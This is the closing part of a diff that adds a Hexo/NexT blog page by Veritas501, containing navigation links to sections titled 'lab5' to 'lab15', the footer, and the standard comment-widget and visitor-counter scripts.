href="#lab5"><span class="nav-number">6.</span> <span class="nav-text">lab5</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#lab6"><span class="nav-number">7.</span> <span class="nav-text">lab6</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#lab7"><span class="nav-number">8.</span> <span class="nav-text">lab7</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#lab8"><span class="nav-number">9.</span> <span class="nav-text">lab8</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#lab9"><span class="nav-number">10.</span> <span class="nav-text">lab9</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#lab10"><span class="nav-number">11.</span> <span class="nav-text">lab10</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#lab11-1"><span class="nav-number">12.</span> <span class="nav-text">lab11-1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#lab11-2"><span class="nav-number">13.</span> <span class="nav-text">lab11-2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#lab12"><span class="nav-number">14.</span> <span class="nav-text">lab12</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#lab13"><span class="nav-number">15.</span> <span class="nav-text">lab13</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#lab14"><span class="nav-number">16.</span> <span class="nav-text">lab14</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#lab15"><span class="nav-number">17.</span> <span class="nav-text">lab15</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+        <div class="back-to-top">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2017 &mdash; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Veritas501</span>
+
+  
+
+  
+</div>
+
+
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> v3.7.1</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://theme-next.org">NexT.Gemini</a> v6.3.0</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=6.3.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=6.3.0"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=6.3.0"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=6.3.0"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.3.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=6.3.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.3.0"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  
+  
+  <script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+  
+  <script type="text/javascript">
+    var GUEST = ['nick','mail','link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(function (item) {
+      return GUEST.indexOf(item)>-1;
+    });
+    new Valine({
+        el: '#comments' ,
+        verify: false,
+        notify: false,
+        appId: '5lMbuXdt5hbFRNKM5uaAC1xm-gzGzoHsz',
+        appKey: 'vA8ML592eyDDRr5tl4J9Eco3',
+        placeholder: '说点什么...',
+        avatar:'mm',
+        guest_info:guest,
+        pageSize:'10' || 10,
+    });
+  </script>
+
+
+
+  
+
+
+
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
+  <script>AV.initialize("97qzbH6lJuabRg1KDY7DtJRS-gzGzoHsz", "GS8vVhMCaeXncQF8mQOIShBj");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            
+            counter.save(null, {
+              success: function(counter) {
+                
+                  var $element = $(document.getElementById(url));
+                  $element.find('.leancloud-visitors-count').text(counter.get('time'));
+                
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            
+              var newcounter = new Counter();
+              /* Set ACL */
+              var acl = new AV.ACL();
+              acl.setPublicReadAccess(true);
+              acl.setPublicWriteAccess(true);
+              newcounter.setACL(acl);
+              /* End Set ACL */
+              newcounter.set("title", title);
+              newcounter.set("url", url);
+              newcounter.set("time", 1);
+              newcounter.save(null, {
+                success: function(newcounter) {
+                  var $element = $(document.getElementById(url));
+                  $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+                },
+                error: function(newcounter, error) {
+                  console.log('Failed to create');
+                }
+              });
+            
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+
+  
+
+  
+  
+
+  
+  
+
+  
+
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
